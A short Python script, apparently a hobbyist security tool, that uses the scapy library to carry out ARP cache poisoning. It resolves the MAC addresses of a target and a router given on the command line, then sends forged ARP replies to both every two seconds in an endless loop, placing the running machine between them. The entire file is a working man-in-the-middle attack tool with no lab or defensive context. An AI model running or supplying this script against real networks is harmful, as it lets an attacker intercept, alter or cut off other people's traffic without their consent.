from scapy.all import *
from scapy.layers.l2 import Ether, ARP
import sys
import time


def get_mac_address(ip_address):
    broadcast_layer = Ether(dst="ff:ff:ff:ff:ff:ff")  # broadcast to router
    arp_layer = ARP(pdst=ip_address)
    get_mac_packet = broadcast_layer/arp_layer  # combine bother layers mac + ip
    response = srp(get_mac_packet, timeout=2, verbose=False)[0]
    return response[0][1].hwsrc


def spoof(target_ip, target_mac, router_ip, router_mac):
    packet_router = ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip)  # op 2 = response
    packet_target = ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=router_ip)
    send(packet_router)
    send(packet_target)


target_ip = str(sys.argv[2])  # user input of target and router ip, get with ipconfig / ifconfig
router_ip = str(sys.argv[1])
target_mac = str(get_mac_address(target_ip))
router_mac = str(get_mac_address(router_ip))

try:
    while True:
        spoof(target_ip, target_mac, router_ip, router_mac)
        time.sleep(2)
except KeyboardInterrupt:  # endless loop escape
    print("Bye.")
    exit(0)
